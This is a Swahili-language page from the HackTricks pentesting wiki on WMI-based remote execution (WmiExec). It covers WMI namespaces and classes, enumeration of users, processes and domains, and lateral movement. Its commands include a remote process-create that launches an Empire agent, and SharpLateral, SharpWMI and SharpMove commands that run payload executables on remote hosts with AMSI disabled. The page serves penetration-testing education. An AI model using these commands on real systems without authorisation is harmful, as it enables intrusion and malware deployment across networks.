# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Jinsi Inavyofanya Kazi

Processes zinaweza kufunguliwa kwenye hosts ambapo username na password au hash yake inajulikana, kwa kutumia WMI. Commands hutekelezwa kwa kutumia WMI kupitia Wmiexec, na kutoa uzoefu wa semi-interactive shell.

**dcomexec.py:** Kwa kutumia DCOM endpoints tofauti, script hii hutoa semi-interactive shell inayofanana na `wmiexec.py`. Thamani ya `-object` iliyochaguliwa huteua endpoint; objects zinazotumika ni pamoja na `MMC20.Application`, `ShellWindows`, na `ShellBrowserWindow`, ambapo ya mwisho hutoa mbinu ya Shell Browser Window iliyoangaziwa katika walkthrough ya awali.<sup>[[2]](#references)[[3]](#references)</sup>

## Misingi ya WMI

### Namespace

Ikiwa imepangwa katika hierarchy ya mtindo wa directory, container ya kiwango cha juu ya WMI ni \root, ambapo chini yake directories za ziada, zinazoitwa namespaces, hupangwa.<sup>[[1]](#references)</sup>
Commands za kuorodhesha namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Classes ndani ya namespace zinaweza kuorodheshwa kwa kutumia:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Madarasa**

Kujua jina la WMI class, kama vile `win32_process`, pamoja na namespace ambayo inapatikana ni muhimu kwa operesheni yoyote ya WMI.  
Commands za kuorodhesha madarasa yanayoanza na `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Kuitisha class:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Mbinu

Methods, ambazo ni function moja au zaidi zinazoweza kutekelezwa za WMI classes, zinaweza kutekelezwa.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

Amri za kuthibitisha kama huduma ya WMI inafanya kazi:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Taarifa za Mfumo na Michakato

Kukusanya taarifa za mfumo na michakato kupitia WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Kwa washambuliaji, WMI ni zana yenye nguvu ya kuorodhesha data nyeti kuhusu mifumo au domains.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Kuuliza WMI kwa mbali ili kupata taarifa maalum, kama vile local admins au watumiaji walioingia, kunawezekana kwa uundaji makini wa command.

### **Manual Remote WMI Querying**

Utambuzi wa kisiri wa local admins kwenye mashine ya mbali na watumiaji walioingia unaweza kufanywa kupitia WMI queries maalum. `wmic` pia inasaidia kusoma kutoka kwenye text file ili kutekeleza commands kwenye nodes nyingi kwa wakati mmoja.<sup>[[1]](#references)</sup>

Ili kutekeleza process kwa mbali kupitia WMI, kama vile ku-deploy Empire agent, muundo wa command ufuatao hutumiwa; utekelezaji uliofanikiwa huonyeshwa na return value ya "0":<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Mchakato huu unaonyesha uwezo wa WMI wa kutekeleza amri kwa mbali na kuorodhesha mifumo, ukisisitiza manufaa yake kwa usimamizi wa mfumo na pentesting.

## Zana za Kiotomatiki

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Unaweza pia kutumia **Impacket's `wmiexec`**.


## References

- [1] [Kutumia Credentials Kumiliki Windows Boxes - Sehemu ya 3 (WMI na WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Mwongozo wa Anayeanza wa Impacket Tool Kit, Sehemu ya 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
